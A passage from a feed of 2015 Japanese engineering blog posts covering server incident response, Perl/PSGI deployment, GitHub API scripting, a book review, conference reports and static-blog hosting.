drawableは画像を入れておくだけじゃないでした。今日は障碍の話です。普段障碍対応しているときにやってること考えてることをざっくりと時系列を追って書いていきたいと思います。コンテキストとしてはLinuxサーバでwebサービスをやっていると思っていただければと思います。障碍の検知webサービスを運営していれば、何かしらの監視システムからSlackなりIRCなりメールなり電話なりでアラートの通知が来ると思います。対応報告障碍対応をしている旨をメールなり、何かの連絡手段で伝えます。同じく見ている人がいれば調査作業の分担もできます。状況把握どこで障碍?アラートの通知内容にどのサーバで何が起きた的なことが書いてあるはずなので、それを確認します。だいたいの組織に於いてはサーバ管理表的なものがwebなりExcelなり設定ファイルなりにあるはずなので、そこと照らし合わせてどのプロジェクトのどのロールなのかを把握します。直前に何をした? いつもと違うことは何?webアプリケーションであれば直前に入れた変更が原因かもしれません。また、ちょっと前に入れていた変更だが、cronで時限発火したというケースも考えられるかも知れません。イベント開始で急にトラフィックが上がったと言うことも考えられるかも知れません。普段と変わったことは何かということが把握出来れば対処の幅が広がります。影響範囲は?サービス全体なのか、サービスの1機能の障碍なのか、ミドルウェア障碍なのか、影響がどの範囲に及んでいるのかを見ます。ミドルウェア障碍であれば、最近であれば、冗長化されてるのが普通なので、サービスから切り離して、監視から外せば終わりというパターンも多いです。サービス全体が落ちている場合は、ひとまず重要な関係者に状況の1次連絡すぐにした方が良いでしょう。接続出来る?そもそも、該当サーバに接続出来ない場合は、できることはほぼないので、該当サーバをサービスから外した上で、監視対象から外します。(単体のサーバ障碍の場合)# pingは通る?ping ${IP}# sshできる?ssh ${IP}ログの確認該当サーバ上で動いているミドルウェアやアプリケーションサーバのエラーログを主に見ます。だいたいこの辺に重要な情報が出力されている可能性があります。システムのログも確認した方が良いです。主にsyslogやkernelログを見ると良いでしょう。# syslogを見るless /var/log/syslog# kernelログを見るless /var/log/kern.log# kernelログを見る2dmesgサーバ状態の確認負荷の関係で障碍が起きているのであれば、現在のサーバの状態を確認しましょう。以下のようなコマンドが現状把握に役立つでしょう。# loadaverageおよびログイン中のユーザを見るw# 変なプロセス無いか見るps -ef# orps auxwwww# 開いているポートを確認するnetstat -tlnp# ネットワークコネクションを確認するnetstat -taopen# なにかCPU使いまくってないか見るtop# 現在の負荷の経過を見るdstat -tamsl 5# 過去の負荷情報を見る## CPUsar## memorysar -r## lasar -q対処直前のコミットにバグを入れ込んでしまったのであればリバートすれば解決するでしょうし、特定のサーバ落ちたのであれば、サービスから外してあげるだけで良いかも知れません。障碍の内容によって対処方法は様々です。ここで気を付けたいのは二次災害を起こさないことです。可能であれば、コマンドなり対処スクリプトのレビューをしてもらったり、現状認識に間違いがないかを周りの人にしてもらうと良いでしょう。(往々にして一人で障碍対応せざるを得ない場合もありますが。。)事後報告障碍対応が終わったら、記憶が新鮮なうちに下記の内容をまとめてしかるべき場所に投稿します。この辺の報告のフォーマットはだいたいの組織において決まっていることが多いでしょう。障碍内容影響範囲経過対処方法将来の対策面倒くさがらずに事実をなるべく詳細に書いておくと未来の自分や自組織のためになると思います。私の組織でも過去の障碍報告がだいぶ良い感じにデータベースになっており、たまに読み返すと気付きが得られます。また、この障碍報告を元に、同種の障碍をなるべく起こさない仕組み作りをしていくことが肝要だと思います。終わりに自分が障碍対応しているときにやってること、考えてることをざっくり書いてきました。誰にやり方を教わったわけでもないので、そこは違うとかこうした方がいいとかあれば、いただけると幸いです。明日は、@lycoris102さんのGameJam部 活動年間活動報告です。きっと面白い話なのではないでしょうか。","link":"https://blog.masasuzu.net/entry/2015/12/18/troubleshooting","isoDate":"2015-12-18T13:00:00.000Z","dateMiliSeconds":1450443600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"「たのしいインフラの歩き方」を読み終えて","contentSnippet":"購入したのが 3 ヶ月も前なんですが、持ち歩きながらコツコツ読んでようやく読み終わったので感想をまとめようと思いました。「たのしいインフラの歩き方」、ページ数が多いので電子書籍にするか迷いましたがカバーが可愛かったので本にしました pic.twitter.com/ZwgdH1Izbu— jigyakkuma (@jigyakkuma_) September 8, 2015tweet にもあるように不順な動機で電子書籍ではなく本を購入しましたが、内容が技術書というよりは丁寧に書かれた秘めたる想いという感じだったので本で読むといい感じでした。この書籍は Introduction にも書いてある通り、技術書というよりは著者の経験を元に書かれたインフラに関するまとめとなるもので、そこには共感できる内容もたくさん書かれており、単なる技術書からでは得られない大切なことばかりが書かれてました。670 ページとかなりボリュームはあるので章をわけて感想を整理したいと思います。インフラの心得ここではインフラの中でどのカテゴリにも当てはまるような基本的なことが書かれていました。スタートアップ期に必要なことスタートアップではオフィス設計からネットワーク構築、開発環境(PC など)の管理や NAS や社内サーバを用意するなど意外とやることが多い。そんなところが触れられていたが私自身もこの章に書かれているようなところを現職で担っており、共感できる部分が非常に多くうれしかった。イベント(1)引っ越しオフィスの引っ越しは私も経験したことがあるので、その記憶を照らし合わせながらこの章を読みました。ゼロから構築するのではなく、既に稼働しているものを移設するという構築当初と別の問題が浮上してくるところも「あるある」感があってよかったです。中小企業期に求められることこの章では会社規模が大きくなってきた時に段々とインフラや社内システムなどの責任が重くなってくるのでそれにどう対処していくべきかといったところが触れられてました。イベント(2)事業拡大社内のとあるサービスもオンプレから AWS に移行したことがありましたが、その際にネックとなったのがデータセンターの増設でした。大規模に向けてこの章ではよくある既存環境をどうスケールさせていくかについて触れられています。私自身、業務で直接サーバのインフラ部分を担当することはないのですが、監視・負荷分散・ Infrastructure as Code など知っておくべき内容が多く書かれていたのがよかったですし、広く触れられているので初級編の教科書代わりにしてもよさそう。イベント(3)コスト削減データセンターのクローズ作業や不要なサーバの整理など、コストについてまわるところは日常的に取り組んでいることもあり共感できるところも多かったです。求道者の心得インフラは適用範囲が広く、自分にとってどんな知識が必要かを時間という制約の中でいかに身につけていくかというのは常日頃から意識したいと再認識した。また、そこも含めていちエンジニアとしての技量が測られると思うし、インフラに限らずこれからもエンジニアとしてやっていくならそういった意識も大事にしていきたい。インフラを支える基礎知識インフラの領域とは言わず、エンジニアであれば広く知っておきたいことが書かれているのとサラッと読めるボリュームが GOOD。最後に感想を書くのに振り返りながら軽く読み直しましたが、改めて思ったのが本書に書かれている内容の幅が広すぎて著者は一体何者だ…という感想でした。また所々に書きましたが、共感できる箇所が本当に多くて読んでて面白かったし、自分と同じような体験が書籍として公の場に出たことが素直に喜ばしかったです。会社の中で呼ばれる「インフラ」といった内容は網羅されており、また間口が広い構成になっているのでインフラエンジニアに限らず気軽に読んでいただき、少しでもインフラというジャンルに興味を持っていただける人が増えればと願います。","link":"https://blog.jigyakkuma.org/2015/12/17/tanoshii-infra-impression/","isoDate":"2015-12-17T00:07:38.000Z","dateMiliSeconds":1450310858000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"#chibapm Chiba.pm#7に参加しました。","contentSnippet":"参加しました。雑なスライドですみません。スライド中に出てきてるやつはどれも五反田のお店で出てきます。五反田企業のガイアックスさんとかモバイルファクトリーさんはPerlの会社なので、美味しいごはんを食べたい人は検討してみてはいかがでしょうか。そういえば、Chiba.pmの開催回数がKichijoji.pm、Gotanda.pmに抜かされそうです。。","link":"https://blog.masasuzu.net/entry/2015/12/12/chiba.pm-7","isoDate":"2015-12-12T09:39:37.000Z","dateMiliSeconds":1449913177000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Plack/PSGIなwebアプリケーションの実行環境","contentSnippet":"この記事は、モバイルファクトリー Advent Calendar 2015 11日目の記事です※ 投稿内容は私個人の意見であり、所属企業・部門見解ならびに技術戦略を代表するものではありません。昨日は@rymizukiさんのnpmライブラリの運用と管理についてでした。今日はPerlの話です。お仕事やプライベートでPerlのwebアプリケーションを書くことが多く、いろいろ知見が溜まってきてるので、ここで少し紹介しようと思います。今回はPlack/PSGIなwebアプリケーションの実行環境の話です。mod_perlなアプリケーションとはちょっとコンテキストが違います。少しかっちりコンテキストに近いです。個人で軽くwebアプリケーション立てるならもう少しゆるふわでも問題ないはずです。OSUbuntuのLTSを使うことが多いです。Ubuntu前提の内容が後に続きます。PerlSystem Perlは使ってません。OS/ディストリビューションが変わってもなるべくそのまま動くようにしたいためです。perl-buildで独自ビルドしたPerlを使います。インストール場所としては、 /usr/local/perl/perl-5.${VERSION} に置きます。Perlを独自ビルドしたものをDebian package化して実行環境にはインストールします。他の方法としては、ビルド済みのperlをtarで固めて、配布するというのもあります。どちらでも構わないのですが、ローカルネットワークにaptサーバ立てている関係で、Debian packageの方が運用しやすいのです。また、perlのマイナーバージョンアップの際もDebian packageを作り直した上で、 apt-get upgrade (or aptitude safe-upgrade)で完結するので、aptの操作に慣れていて楽というのもあります。モジュール管理今風にcpanfileでモジュール管理してます。モジュールインストールはCartonを使ってます。Cartonの後継でCarmelも開発されてます。個人的にはそろそろ触っておきたいところです。また、cpanfile.snapshotもレポジトリに入れています。一般的なモジュールは特定の(古い)バージョンに依存せずに動くべきですが、依存モジュールのバージョン違いによって現在動いているアプリケーションが壊れるのを防ぐために、バージョン固定します。cpanfile.snapshotがある状態で下記のように carton install してあげると、どの環境でも同じバージョンのモジュールがインストールされます。carton install --deployment --without develop,test今やってないですが、別方法としては、モジュールがインストール済みの状態で、 carton bundle すると vendar/ にモジュールのtarが固められるので、それもレポジトリ管理した上で、下記の様にインストールするという手もあります。インストールの際は vendor/bin/carton  にfatpackされたcartonコマンドが入るのでそれを使います。(アプリ実行環境にcartonを敢えて入れる必要は無い)# 依存モジュールを固めるcarton bundle# インストール# env.shは後述./script/env.sh vendor/bin/carton install --cached --deployment --without develop,testさらに別方法としては、ビルドサーバで依存モジュールをビルドした上で、ディレクトリごと実行環境にrsyncしてあげる方法です。ビルドサーバを運用しているならば、この方法でも良いでしょう。参照Carton考2014carton bundle && carton install --cachedの使いどころ独自モジュールなるべく、独自モジュールは使わない方が良いのですが、個人的な事情などで、CPANに公開出来ないモジュールに関しては、OrePAN2 でDarkpanを作ってそこからローカルに配信するようにしてます。OrePAN2のサーバを簡単に立ち上げられるOrePAN2::Serverがありますが、一時期は使っていましたが、モジュールのアップロード機能は別にいらないなどの理由で今はwebサーバから静的配信してます。環境変数プロジェクトのレポジトリに config/env.rc という名前で、アプリケーションを動かすために必要な環境変数を定義したファイルを作ります。PERL5_VERSION=\\"22\\"export PROJECT_BASE=\\"/path/to/project\\"export PERL_CARTON_MIRROR=\\"http://orepan.local/\\"export PERL5LIB=\\"${PROJECT_BASE}/local/lib/perl5:${PROJECT_BASE}/lib\\"export PATH=\\"${PROJECT_BASE}/local/bin:/usr/local/perl/perl-5.${PERL5_VERSION}/bin:${PATH}\\"export PLACK_PORT=5555また、 script/env.sh という名前で config/env.rc を読み込んだ上で、プログラムを実行するラッパースクリプトを作ります。スクリプトなどは基本的にこれを通して実行します。#!/bin/bash -ue# 諸々環境変数を設定した上でコマンドを実行する君##       env.sh perl hogehoge.pl#source /path/to/project/config/env.rcexec \\"$@\\"開発環境で、いちいちラッパースクリプト通すのが面倒な場合は、config/env.rc のsymlinkをプロジェクトルートに .envrc として張った上で、direnv使って済ましてしまう場合もあります。web サーバ起動スクリプトpsgiファイルを plackup するのではなく、こんな感じのスクリプトをscript/web みたいな名前で 用意してアプリケーションサーバを起動するようにしてます。#!/usr/bin/env perluse strict;use warnings;use lib \\"$ENV{PROJECT_BASE}/lib\\";use Plack::Loader;use SomeApplication::Config;use SomeApplication::Web::Handler;my $config = SomeApplication::Config->load();my $app    = SomeApplication::Web->to_app();Plack::Loader->load(    $config->{psgi}->{server},    %{ $config->{psgi}->{config} },)->run($app);また、このスクリプトをstart_serverを経由して起動することで、(graceful restartによる)ホットデプロイをできるようにしてます。start_server のプロセスにSIGHUPを送ると子プロセスのアプリケーションサーバを再起動してくれるのですが、 plackup コマンドで起動してると start_server に渡した引数をそのまま使ってplackup を再起動するので、 max_workers の数を変えたいときなど、 start_server 自体のプロセスを再起動しなくてはならないので不便です。なので、起動スクリプトを作ってます。そのほかにも理由があるのですが、参照リンクに詳しくあります。サーバ実装としては、StarletやGazelleを使ってます。参照PSGI/Plackアプリケーションの起動方法いろいろと本番環境アレコレ普通に使う Plack/PSGI ServerGraduate from .psgiデーモン管理現在はUpstartでアプリケーションサーバのデーモン管理してます。以下の理由で、個人的には好きでした(過去形)。最新のUbuntuはSystemdに変わってしまったので、将来的にはSystemdに移行することになるでしょう。Ubuntuに標準で入っていてサーバ起動時の自動起動してくれてデーモン異常終了時に自動再起動してくれて設定はわりかしわかりやすい/etc/init/web-some-application.conf みたいな名前でこんな設定ファイルを作りますdescription \'some web application\'author \'masasuzu <hogehoge@masasuzu.net>\'start on runlevel [2345]stop on starting rc RUNLEVEL=[016]setuid webappsetgid webapp# 異常時に再起動するrespawnscript    . /path/to/project/config/env.rc    export PLACK_ENV=\\"production\\"    exec ${PROJECT_BASE}/local/bin/start_server \\\\        --interval 10           \\\\        --port ${PLACK_PORT}    \\\\        -- ${PROJECT_BASE}/script/service/webend script上記のファイルを作ると以下のように操作出来ます。reloadでSIGHUPが送れるので、アプリケーションサーバのstart_server経由のgraceful restartができます。# 起動service web-some-application start# 停止service web-some-application stop# (start_serverのプロセスごと)再起動service web-some-application restart# Plackサーバを再起動service web-some-application reloadアプリケーションサーバ以外も、ジョブのワーカーなども、独自に設定ファイルを作って、Upstart経由で起動したりしてます。Upstart以外の選択肢としては、先に挙げたSystemdの他、以下のものがあるでしょう。好みと要件に合わせて使えば良いと思います。daemontoolsSuvpervisordSystemd参照Server::Starterから学ぶhot deployの仕組みServer::Starter の --interval オプションは大切Upstart を使ってお手軽 daemon 化Upstart Intro, Cookbook and Best PractisesおわりにWAF(Web Application Framework)やログの話など膨らまそうと思えばもっと膨らませられますが、実行環境の話なので、ここまでで抑えておきます。ざっくりと、Plack/PSGIなアプリケーションの実行環境について説明してきました。PerlでWebアプリケーションを作る時に何か参考になれば幸いです。また、もっと良い方法があれば、教えていただけるとありがたいです。明日は、@nekobato さんです webpackのなにか面白い話があるんじゃないかとわくどきしてます。","link":"https://blog.masasuzu.net/entry/2015/12/11/plack-psgi-exec-env","isoDate":"2015-12-11T04:30:00.000Z","dateMiliSeconds":1449808200000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Github APIを使おう","contentSnippet":"この記事は、モバイルファクトリー Advent Calendar 2015 4日目の記事です今日は、Github APIの話です。Githubの管理作業は他のWebサービスと同じく基本Webコンソールでできます。ただ、Organizationとかを管理してる場合、ある程度以上規模が大きくなると、定型的な管理作業が増えて、Webでぽちぽちやるには煩雑でつらくなってきます。ここで怠惰エンジニア*1はどうにかこの定型作業を自動化/スクリプト化できないかなと考え始めます。幸い、GithubにはAPIがあるので、これを利用して要件に合わせて、実装することができます。ドキュメントは以下の場所にあるので、各APIの使い方などはそちらを参照してください。GitHub API v3 | GitHub Developer Guideapiアクセスを投げるpublicな情報を取得するには普通にcurlでGET発行するだけで、取得出来ます。curl https://api.github.com/users/masasuzu/reposが、これだけでは、privateな情報にアクセスできません。ので、Basic認証をしてアクセスをします。curl -u ${USER}:${PASSWORD} https://api.github.com/orgs/some_privete/reposただ、この場合、このアカウントで出来ることが全て実行出来てしまうので、下記のリンクからアクセストークンを発行して、権限を絞ってAPIにアクセスするのが望ましいです。アクセストークンは作成時にしか見れないので、ちゃんと書き留めておくようにしましょう。Personal access tokensアクセストークンを使用した場合、下記の3つの方法で認証出来ます。curl -u :${ACCESS_TOKEN} https://api.github.com/orgs/some_privete/reposcurl -H \'Authorization: token ${ACCESS_TOKEN}\' https://api.github.com/orgs/some_privete/reposcurl \'https://api.github.com/orgs/some_private/repos?access_token=${ACCESS_TOKEN}\'ドキュメントに各API発行に必要なscope(権限)が書いてあるので必要なscopeだけ付与してあげると良いです。perlでの選択肢今までで、APIアクセスする手段を得ることはできましたが、シェルスクリプトで処理を組み立てるのは、無謀なので、使い慣れてるプログラミング言語で実装したいところです。当社ではPerlを使い慣れてるエンジニアが多いので、ここではPerlのクライアントを紹介します。現在のところ以下の2つの選択肢があります。PithubNet::Github私はPithubを使っています。使い始めた時期においてPithubの方が更新されてそうだったからです。が、今見るとNet::Githubも更新されてるように見えます。他の言語での選択肢特にプログラミング言語にこだわりが無いのであれば、githubがメンテナンスしてるoctokitを使うと良いと思います。RubyとObjective C、.Netに対応してます。たぶん鉄板だと思います。(しかし、octokitのこのサンライズというかバンダイに怒られそうなデザインは大丈夫なのでしょうか?まとめ煩雑で定型的な作業はGithub APIで自動化すると良いPrivateな情報の操作はアクセストークンを発行してAPIを発行するPerlにはPithubとNet::Githubのクライアントライブラリがあるこだわりがなければ、クライアントはoctokit使うと良い明日は、 @mihyaeru21 さんです。iOS回りの面白いエントリが見れそうです。*1:プログラマの3大美徳の1つ","link":"https://blog.masasuzu.net/entry/2015/12/04/use_github_api","isoDate":"2015-12-04T14:47:44.000Z","dateMiliSeconds":1449240464000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"GCPUG Shonan vol.0 に参加してきた","contentSnippet":"タイトルの通り、GCPUG が湘南(今回は茅ヶ崎)で開催されるということでお邪魔してきました。まずは開催いただきましたスタッフの皆様ありがとうございました！AIZAC 様もありがとうございました！ロケーションが最高でした。GCPUGに来た pic.twitter.com/lkfEXWj1kC— jigyakkuma (@jigyakkuma_) November 29, 2015行く前は GCPUG の趣旨がはっきりとわかっていませんでしたが、大規模な勉強会というよりかは小規模で対話しながら参加者に理解を深めてもらうといったイベントでした(今回はハンズオン)。作業環境準備まずはじめに作業環境の準備をしましたが、Developer Console の Cloud Shell を立ち上げるだけで終わった。Cloud Shellけっこう便利だし、今後使う機会が増えるかもと思ったのでポイントを整理Google Cloud Shellディストリビューションは Debian(確認した時点でバージョンは 8.2)ツール類が色々入ってる(Available tools)言語も色々入れてくれてる(Go は 1.5 が入ってた)(Language support)Docker on GCE作業用のインスタンスを立ち上げるインスタンスに ssh でつなぐDocker pull & runこの辺りでもいくつかポイントがあったOS 自体の機能がいらない用途なら軽量ディストリビューション Alpine linux の Docker image を使うのオススメインスタンスのメタデータをとってこれる API が用意されている(Storing and Retrieving Instance Metadata)Instance Metadata の詳細についてはハンズオンを行っていただいた大橋さんが後ほど記事にしてまとめてくださるそうなので楽しみに待ってます。その他Docker machine ちょっと触ってみたDocker コマンドの説明DockerHub の注意点Google Container Registryの紹介最後は懇親会でみんなでわいわいしました。ハンズオンの参加は初めてだったんですが、各人が手を動かしたり詰まったところを教え合ったりというのは参加者同士の距離も縮まり一体感があっていいなーと思いました。地元開催ということもあり微力ながら力添えが出来ればと思っておりますので今後も参加していこうかと思います。","link":"https://blog.jigyakkuma.org/2015/11/30/gcpug-shonan00/","isoDate":"2015-11-29T23:23:26.000Z","dateMiliSeconds":1448839406000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"blog の環境を Hugo + wercker + GCS にしてみた","contentSnippet":"Hugo + wercker + gcs にしてみた！とか言ってますが S3 使ってたのを GCS に変えただけって話です。blogを参考にしていただけるといいかと思います。先日、GCS にデプロイする wercker のstepsを見つけ、早速試してみたのですがうまくいかず。werckerでGCSにデプロイするやつ、なんかうまくいかないなーと思ってたけど.botoファイルをechoで作るときに-eオプション抜けてて改行が出来てなかったっていう初歩的ミスやった...— jigyakkuma (@jigyakkuma_) October 10, 2015というオマヌケなミスでした。以下が現時点で使用している wercker.yml です。これで作成したバケットにデプロイされるところまではよかったんですが、GCS の public 設定がよくわかんなーと思いながら調べてると参考になるblogがあったのでこちらを元に設定。ここをちゃんと読めば書いてそうなのであとで読もうかと思います…次はサイト監視したいなーと思うので、そのあたりで何にしようか検討中です。","link":"https://blog.jigyakkuma.org/2015/10/12/hugo_wercker_gcs/","isoDate":"2015-10-11T16:10:10.000Z","dateMiliSeconds":1444579810000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"AWS からのメールをいい感じに slack に通知するやつ","contentSnippet":"社内とある一言から話は始まった。awsのサポートから返信来たのslackにながしたいんだけどSNSで通知とかできないんだろうか— fujiwara (@fujiwara) September 16, 2015弊社の場合、AWS のアカウントを親アカウント+各プロジェクト毎のアカウント(常時 50 以上はある)といった形で運用しているので AWS SNS を各アカウントに設定するのしんどいのと深淵なる理由により Gmail で受信した AWS のメールを from でフィルタして転送というのもうまくいかなかったので GoogleAppsScript を書いた。これにトリガーを 1 分周期で回しておくといい感じに slack へメールを投げてくれる。こんな感じで通知がきます。やりたかったのはメールヘッダに[X-AMAZON-MAIL-RELAY-TYPE: notification]っていう丁度いい感じのカスタムヘッダがあったのでこれが来たら slack に投げるってのをやってます。社内が Slack になってからコミュニケーションツールであーだこーだすることが増えた気がしますが、作業環境が改善されていくのを体感できるのはけっこう楽しいのですね！[追記]ここの容量制限には[Gmail の読み取りと書き込み（送信以外）]で 50,000 個/日って書いてるけど、どこでひっかかってるんだ…https://docs.google.com/macros/dashboard","link":"https://blog.jigyakkuma.org/2015/09/18/aws-mail-forward/","isoDate":"2015-09-17T23:43:02.000Z","dateMiliSeconds":1442533382000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"#gotandapm Gotanda.pm Perl Technology Conference #6 でLTしてきました。","contentSnippet":"gotanda-pm.connpass.comGotanda.pmでLTしてきました。今回のテーマは障碍でした。半分ネタのトークです。JSTQB Foundation Level のシラバスに載っているソフトウェアテストの7原則をもじったやつです。JSTQB認定テスト技術者資格-シラバス（学習事項）・用語集-言ってみれば、サービスに対して継続的にテストするのが監視なのでテストに対する原則が監視に対しても言えるんじゃないかなーという軽い思いつきから生まれました。無理矢理な部分もありましたが、わりかし当てはまってる部分もあったのではないかと思いました。トーク中美味しいにおいがしてきてつらかったです。(このエントリは懇親会の前に書かれてます)#gotandapm 美味しそうなにおいがして辛い。。。。— masasuzu? (@masasuz) September 17, 2015ガイアックスさん会場提供ありがとうございました。","link":"https://blog.masasuzu.net/entry/2015/09/17/Gotanda.pm6","isoDate":"2015-09-17T12:14:35.000Z","dateMiliSeconds":1442492075000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#yapcasia YAPC::Asia 2015でボランティアスタッフしてきた","contentSnippet":"今年のYAPC::Asiaは終わった。つつがなく終わりました。過去のエントリを見直すと2011、2012年は書くのサボっていたみたいでした。私のYAPC::Asia初参加は2010年で6回目の参加でした。#yapcasia YAPC::Asia 2014でボランティアスタッフやってきました - 目の前に僕らの道があるmasasuzu.hatenablog.jp#yapcasia YAPC::Asia Tokyo 2013に参加してきました。 - 目の前に僕らの道があるmasasuzu.hatenablog.jpYAPC::Asia 2010へ行ってきたよ。 - 目の前に僕らの道があるmasasuzu.hatenablog.jp今年のYAPCとの関わり方は個人スポンサー+ボランティアスタッフとして参加しました。個人スポンサーとしては4年目、ボランティアスタッフとしては3年目でした。今年のYAPCもすごい楽しかったです。特にここ1,2年でPerl関係の人たちの知り合いがすごい増えたので、いろんな人と話ができてすごい楽しかったです。トークの方は例年スタッフ業をやっていると聞けないので、(会場にいてもスタッフのお仕事に意識が行くので内容を聞き取れてないことが多い)、動画が上がったら気になっていたトークを追いたいと思います。さて、だいたい6年前からWebで、Perlでお仕事するようになってからYAPCにはいろいろなものをもらってきました。だからこそ、ボランティアスタッフをやったり、個人スポンサーになって自分がもらったものを間接的に他の人に与えられたらいいなと思ってやってきました。自分がもらったものを他の人も受け取ってもらえたらなら良いなと思います。YAPC::Asiaはいったん終わります。それ自体いろいろ思うところがありますし、残念ではあります。YAPC::Asiaが無くなっても地域PMなどのPerlのコミュニティ自体が無くなるわけではないので私も細々とコミュニティ活動していきます。ただ、全国的にPerlな人が集まってくるイベントが今のところ来年無いのは寂しいところです。もしどこかで動きがあるならお手伝いさせていただければなと思います。YAPC::Asiaお疲れ様でした。(初日の懇親会の後の二次会でいろんな人に迷惑かけてしまったようなのでものすごく反省しています。すみません。お酒気を付けます。。。会期中のつぶやきいくつかおしゃれなカップだ #yapcasia pic.twitter.com/NwWw30i3HW— masasuzu? (@masasuz) August 22, 2015#yapcasia Perl6！ pic.twitter.com/2tJh6irctZ— masasuzu? (@masasuz) August 22, 2015#yapcasia  壇上から。お疲れさまでした！！ pic.twitter.com/1MiU56gE4R— masasuzu? (@masasuz) August 22, 2015","link":"https://blog.masasuzu.net/entry/2015/08/23/YAPC_Asia","isoDate":"2015-08-23T10:17:16.000Z","dateMiliSeconds":1440325036000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"YAPC::Asia2015 の所感と俺達のこれから","contentSnippet":"とうとう終わってしまった YAPC::Asia、全身全霊でもって楽しませていただきました。トークの振り返りYAPC::Asia2015 はスピーカーとして参加させていただき、貴重な体験をさせていただいたと共に登壇を通して少しでも YAPC::Asia に恩返しできたらという想いでした。YAPC::Asia2015 に登壇させていただいたからこそ感じられたことも合わせてご覧いただければと思います。YAPC::Asia の意義私の周りでよく聞いたり感じたのが「同窓会っぽい」ってとこです。雑感そういえば昨年も YAPC::Asia に参加させていただき、「次回は個人スポンサーとして参加します！！」みたいなことを言ってたのは宣言通り個人スポンサーチケットを購入できたのでそこはよかったです。これからのこと「カンファレンスに参加したいならやりたい人がやればいい！」とは思うものの、簡単にできるものではないし、主催者になりたいわけではないというのが本音ではある。最後にイベントや勉強会にはちょくちょく顔を出していますので見かけましたらお気軽にお声がけいただけると嬉しいです。一緒にわいわいしましょう！！謝辞運営スタッフ個人・企業スポンサースピーカーYAPC::Asia に参加された皆様YAPC::Asia2015 に関わった全ての皆様があってこそ最高のカンファレンスになりましたので末筆となりますが厚く御礼申し上げます。","link":"https://blog.jigyakkuma.org/2015/08/23/yapcasia2015_secondday/","isoDate":"2015-08-23T07:43:26.000Z","dateMiliSeconds":1440315806000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"YAPC::Asia2015 に登壇させていただいたからこそ感じられたこと","contentSnippet":"皆様YAPC 全体を通した感想は明日書くとして、ここでは最後の YAPC::Asia で登壇させていただいた貴重な機会について触れたいと思います。周りの応援振り返ってみると、ここまでこれたのは周りの応援あってこそだなーというのが実感としてありました。@Konboiさん、登壇前の応援や後にお声がけいただいた方々。登壇後の反応トークに足を運んでいただく方々に少しでも楽しんでいただきつつ役に立つ話が出来ればという心情で準備に取り組みました。登壇から見えたもの今回取り上げた取り組みでは不完全なところがあり、そこはしっかりと質疑応答で突っ込まれました。得るもの ＜ 与えるものとなるのが理想であるし、自身のトークがそうなっていなかったと後から気付いたところは非常に反省であると言えます。最後に大きなカンファレンスで一同がワイワイする機会ってそんなにないし、やっぱりみんなでワイワイするのは楽しい。余談Twitter アイコンのステッカー（ぱんつあり/ぱんつなし）を用意しましたのでもし受け取っていただける方はお声がけいただけばお渡しいたします！追記公式ページ URL とスライドは以下からご参照ください。YAPC::Asia2015 それは僕たちのドメイン・ DNS 運用","link":"https://blog.jigyakkuma.org/2015/08/22/yapcasia2015_firstday/","isoDate":"2015-08-21T15:39:14.000Z","dateMiliSeconds":1440171554000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"YAPC::Asia 2015 でドメイン・ DNS の運用について話します","contentSnippet":"いよいよ YAPC::Asia 2015 もいよいよ開催間近ですね。勢いだけでトークを応募させていただき、トーク採択という奇跡が起こって気絶しそうになったのがもう 2 ヶ月も前のこと。早いものですね。詳細については以下のリンクをご覧いただくのが早いかと思いますのでご興味ございましたらクリックをお願いいたします。http://yapcasia.org/2015/talk/show/e8eebd70-f906-11e4-8f91-8ab37d574c3aそれでは YAPC::Asia 2015 でお会いできることを楽しみにしております！！！！！がんばって資料仕上げます！！！！！！１","link":"https://blog.jigyakkuma.org/2015/08/18/yapcasia2015_intro/","isoDate":"2015-08-18T00:07:11.000Z","dateMiliSeconds":1439856431000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"blog の環境を Hugo + wercker + s3 にしてみた","contentSnippet":"最近 CI を触る機会があるというのとGitHub Pagesの設定をいじっていたら名前解決のところのトラブルでイライラしたのでAWS S3に乗り換えたというメモです。まずは手前で使う CI ですが、Hugo との組み合わせで割と使ってる事例が多いって安直な理由でとりあえずwerckerを使ってみることにしました。参考記事としてdeeeet さんの記事をめちゃ読みました。ほんと先人には感謝ですね。m0t0k1ch1 さんの記事も参考にさせていただいております。blog を octopress から Hugo に乗り換えたメモなので興味がございましたらこちらもご覧ください。それでは各項目で何をしたかザッと書いていきます。準備リポジトリまずリポジトリですが、元となる md ファイルをオープンにしたくなかったのでbitbucketのプライベートリポジトリを使うことにしました。ディレクトリ構成はこんな感じです。.├── archetypes    //md ファイルのフォーマット├── config.toml   //Theme の設定ファイル├── content│\xa0\xa0 └── post      //md ファイル├── public        //Hugo で build したファイルが置かれる、リポジトリで管理しないので ignore してる├── static        //画像もろもろ│\xa0\xa0 ├── assets│\xa0\xa0 └── images│       └── post  //記事に使う画像置き場├─── themes       //好きな theme を git submodule で配置└─── wercker.ymlHugoCI 回すまでは手動で build して public ディレクトリに出来た生成物を GitHub Pages 用リポジトリに push するみたいなのやってました。今は新しい記事の作成とローカルで記事のプレビューに使ってるくらいです。wercker冒頭でも書きましたがwerckerを今回は使っています。CircleCIでもよかったのですが、こちらは業務で使う機会があったというのもあり採択しませんでした。それでは wercker の準備ですが、サクッと SignUp したらApplicationsから Application を作っちゃいます。注意点としては筆者の wercker.yml で指定している box は docker 用ではないので「Docker enabled. See our stacks documentation for more details.」のチェックは入れないようにします。GitHubやbitbucketだとリポジトリの指定も簡単だし、deploy key を入れてリポジトリにアクセスできるようにしてくれるので便利。あとは用意した wercker.yml をリポジトリに突っ込みます。以下が用意した yml です。他の CI もそうですが yml 見ればどの CI 使ってるのかがわかっていいですね。box や step はExploreにいろいろ置かれているので必要なものを組み合わせればすぐに使い始められて便利。AWS S3普段 AWS を使ってないのであれば AWS アカウントから作成するのは少々手間ですね…（筆者も今回のために個人の AWS アカウントを作りました）S3 でドメインと同名の 